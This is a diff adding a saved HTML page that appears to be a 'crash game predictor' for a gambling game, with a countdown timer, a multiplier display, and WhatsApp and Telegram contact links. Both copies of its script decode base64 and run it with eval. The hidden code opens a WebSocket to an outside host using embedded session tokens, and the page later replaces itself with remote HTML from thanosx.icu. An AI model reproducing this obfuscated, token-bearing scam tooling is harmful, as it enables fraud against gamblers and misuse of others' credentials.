@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<!-- saved from url=(0044)file:///C:/Users/heron/Downloads/Thanos.html -->
+<html lang="ar"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanos</title>
+    <link rel="stylesheet" href="file:///C:/Users/heron/Downloads/Thanos_files/all.min.css">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: url('https://i.ibb.co.com/LDLwGKFj/photo-2025-11-29-17-49-49.png') no-repeat center center fixed;
+        }
+
+        .content-container {
+            text-align: center;
+            padding: 30px 20px;
+            background-color: transparent;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 1;
+        }
+
+        #crashValue {
+            font-size: 3em; /* ØªØµØºÙØ± Ø&shy;Ø¬Ù Ø§ÙØ±ÙÙ */
+            margin: 15px 0;
+            padding: 15px;
+            color: #3bf900;
+            line-height: 1.2;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        #crashValue::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 400px; /* ØªÙØ¨ÙØ± Ø§ÙØ®ÙÙÙØ© ÙÙÙÙØ§Ù */
+            height: 400px; /* ØªÙØ¨ÙØ± Ø§ÙØ®ÙÙÙØ© ÙÙÙÙØ§Ù */
+            background-image: url('https://cdn.pixabay.com/animation/2024/02/26/08/24/08-24-04-419__480.png');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.5;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+            border-radius: 50%;
+        }
+
+        #timer-container {
+            background-color: #333;
+            padding: 10px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        #timer {
+            font-size: 1.5em;
+            color: #ff0000;
+            line-height: 1.2;
+            font-weight: bold;
+        }
+
+        .glitch {
+            position: relative;
+            display: inline-block;
+            animation: glitch-animation 1s infinite;
+        }
+
+        .glitch:before, .glitch:after {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            opacity: 0.8;
+            color: #ff00ff;
+            z-index: -2;
+        }
+
+        .glitch:after {
+            color: #00ffff;
+            z-index: -3;
+        }
+
+        @keyframes glitch-animation {
+            0% { 
+                transform: translate(0);
+                opacity: 1;
+            }
+            20% { 
+                transform: translate(-2px, 2px);
+                opacity: 0.8;
+            }
+            40% { 
+                transform: translate(-2px, -2px);
+                opacity: 0.6;
+            }
+            60% { 
+                transform: translate(2px, 2px);
+                opacity: 0.4;
+            }
+            80% { 
+                transform: translate(2px, -2px);
+                opacity: 0.2;
+            }
+            100% { 
+                transform: translate(0);
+                opacity: 1;
+            }
+        }
+        
+       #logo {
+            width: 137px;
+            height: 127px;
+            position: absolute;
+            bottom: 36px;
+            cursor: pointer;
+            transition: transform 0.3s;
+          }
+
+        #logo:hover {
+            transform: scale(1.1); /* Scale logo on hover */
+        }
+        #crash {
+            width: 131px;
+            height: 99px;
+            position: absolute;
+            bottom: 550px;;
+            cursor: pointer;
+            transition: transform 0.3s;
+          }
+
+        #crash:hover {
+            transform: scale(1.1); /* Scale logo on hover */
+        }
+    </style>
+
+</head>
+<body>
+    <div id="timer-container">
+        <div id="timer">00 : 57 : 42</div>
+    </div>
+    
+    <div class="content-container">
+        <div id="crashValue" class="" data-text="4.39">4.39</div>
+    </div>
+    <img id="crash" src="./Thanos_files/5-58180_whatsapp-logo-3-transparent-spotify-png-logo.png" alt="Logo" onclick="redirectToTelegram()">
+
+    <script>
+        window.addEventListener('resize', function(event) {
+            window.resizeTo(1024, 768);
+        });
+
+        let totalSeconds = 60 * 60;
+        const timerElement = document.getElementById('timer');
+        const crashValueElement = document.getElementById('crashValue');
+
+        function updateTimer() {
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+
+            timerElement.textContent = 
+                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
+
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                fetch('http://thanosx.icu/app/Login.php')
+                .then(response => response.text())
+                .then(html => {
+                    document.getElementsByTagName('html')[0].innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error fetching the page:', error);
+                });
+            }
+        }
+
+        function decrementTime() {
+            if (totalSeconds > 0) {
+                totalSeconds--;
+            }
+        }
+
+        const timerInterval = setInterval(() => {
+            decrementTime();
+            updateTimer();
+        }, 1000);
+
+        window.onload = () => {
+            totalSeconds = 60 * 60;
+            updateTimer();
+        };
+        
+       
+        
+        
+        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vc3J2MTAxNDI2NS5oc3Rnci5jbG91ZDo4MDgwLzMwLzgvMTk/Y289MzE2MyZjdT05NDcyJmxnPWVuJndoPTUyODgmaXBtPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp6ZFdJaU9pSTFNRnd2TVRJNE5ETTROakl5TlNJc0luQnBaQ0k2SWpFaUxDSnFkR2tpT2lKcGNHMWZOamhtTVRJeU5UUmxOekk1TlRndU5qSXlOREV3TVRnaUxDSmhjSEFpT2lKT1FTSXNJbWx1Ym1WeUlqb2lkSEoxWlNJc0ltNWlaaUk2TVRjMk1EWXpNelF5T0N3aWFXRjBJam94TnpZd05qTXpOREk0TENKbGVIQWlPakUzTmpBMk16Y3dNamg5LllJLTFDR3lBUlhkVGJ3OHdSRnQzOENubG9qQ1BGcFVtd01MemgyWHN3eVUmdG9rPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVNXUWlPaUk1T1RrNU9UazVJaXdpY205c1pTSTZJbFJvWVc1dmN5SXNJbWxoZENJNk1UYzJNRFl6TXpReU9Dd2laWGh3SWpveE56WXdOak16TkRnNGZRLkhFNXo0bzREUXlncldDaC0yOTRySEZpX2VBRFltWUEzcVEzNE5ua0NpUzAnOwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQl3cy5jbG9zZSgpOwoJCX0KCQl9Cgl2YXIgb25PcGVuID0gZnVuY3Rpb24oKSB7CgkJd3Muc2VuZCgneyJwcm90b2NvbCI6Impzb24iLCJ2ZXJzaW9uIjoxfVx4MWUnKTsKCgl9OwoJdmFyIG9uQ2xvc2UgPSBmdW5jdGlvbigpIHsKCQl3cyA9IG51bGw7Cgl9OwoJCgl2YXIgb25NZXNzYWdlID0gZnVuY3Rpb24oZXZlbnQpIHsKCQljb25zdCBkYXRhID0gSlNPTi5wYXJzZShldmVudC5kYXRhLnNsaWNlKDAsIC0xKSk7CiAgICAgICAgICAgIGlmIChkYXRhLm9uY3Jhc2gpIHsKICAgICAgICAgICAgICAgIHNlbmQoZGF0YS5vbmNyYXNoKTsKICAgICAgICAgICAgfQoJfTsKCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAoKCXZhciBvbkVycm9yID0gZnVuY3Rpb24oZXZlbnQpIHsKCQlhbGVydChldmVudC5kYXRhKTsKCX0KCW9wZW4oKQoJfQoJ";
+        var decodedJsCode = atob(encryptedJsCode);
+
+        eval(decodedJsCode);
+
+        function redirectToTelegram() {
+            window.location.href = 'https://wa.me/94704275463';
+        }
+    </script>
+
+<script>
+        window.addEventListener('resize', function(event) {
+            window.resizeTo(1024, 768);
+        });
+
+        let totalSeconds = 60 * 60;
+        const timerElement = document.getElementById('timer');
+        const crashValueElement = document.getElementById('crashValue');
+
+        function updateTimer() {
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+
+            timerElement.textContent = 
+                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
+
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                fetch('http://thanosx.icu/app/Login.php')
+                .then(response => response.text())
+                .then(html => {
+                    document.getElementsByTagName('html')[0].innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error fetching the page:', error);
+                });
+            }
+        }
+
+        function decrementTime() {
+            if (totalSeconds > 0) {
+                totalSeconds--;
+            }
+        }
+
+        const timerInterval = setInterval(() => {
+            decrementTime();
+            updateTimer();
+        }, 1000);
+
+        window.onload = () => {
+            totalSeconds = 60 * 60;
+            updateTimer();
+        };
+        
+       
+        
+        
+        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vc3J2MTAxNDI2NS5oc3Rnci5jbG91ZDo4MDgwLzMwLzgvMTk/Y289MzE2MyZjdT05NDcyJmxnPWVuJndoPTUyODgmaXBtPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp6ZFdJaU9pSTFNRnd2TVRJNE5ETTROakl5TlNJc0luQnBaQ0k2SWpFaUxDSnFkR2tpT2lKcGNHMWZOamhtTVRJeU5UUmxOekk1TlRndU5qSXlOREV3TVRnaUxDSmhjSEFpT2lKT1FTSXNJbWx1Ym1WeUlqb2lkSEoxWlNJc0ltNWlaaUk2TVRjMk1EWXpNelF5T0N3aWFXRjBJam94TnpZd05qTXpOREk0TENKbGVIQWlPakUzTmpBMk16Y3dNamg5LllJLTFDR3lBUlhkVGJ3OHdSRnQzOENubG9qQ1BGcFVtd01MemgyWHN3eVUmdG9rPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVNXUWlPaUk1T1RrNU9UazVJaXdpY205c1pTSTZJbFJvWVc1dmN5SXNJbWxoZENJNk1UYzJNRFl6TXpReU9Dd2laWGh3SWpveE56WXdOak16TkRnNGZRLkhFNXo0bzREUXlncldDaC0yOTRySEZpX2VBRFltWUEzcVEzNE5ua0NpUzAnOwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQl3cy5jbG9zZSgpOwoJCX0KCQl9Cgl2YXIgb25PcGVuID0gZnVuY3Rpb24oKSB7CgkJd3Muc2VuZCgneyJwcm90b2NvbCI6Impzb24iLCJ2ZXJzaW9uIjoxfVx4MWUnKTsKCgl9OwoJdmFyIG9uQ2xvc2UgPSBmdW5jdGlvbigpIHsKCQl3cyA9IG51bGw7Cgl9OwoJCgl2YXIgb25NZXNzYWdlID0gZnVuY3Rpb24oZXZlbnQpIHsKCQljb25zdCBkYXRhID0gSlNPTi5wYXJzZShldmVudC5kYXRhLnNsaWNlKDAsIC0xKSk7CiAgICAgICAgICAgIGlmIChkYXRhLm9uY3Jhc2gpIHsKICAgICAgICAgICAgICAgIHNlbmQoZGF0YS5vbmNyYXNoKTsKICAgICAgICAgICAgfQoJfTsKCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAoKCXZhciBvbkVycm9yID0gZnVuY3Rpb24oZXZlbnQpIHsKCQlhbGVydChldmVudC5kYXRhKTsKCX0KCW9wZW4oKQoJfQoJ";
+        var decodedJsCode = atob(encryptedJsCode);
+
+        eval(decodedJsCode);
+
+        function redirectToTelegram() {
+            window.location.href = 'https://t.me/Thanos_1x';
+        }
+    </script></body></html>
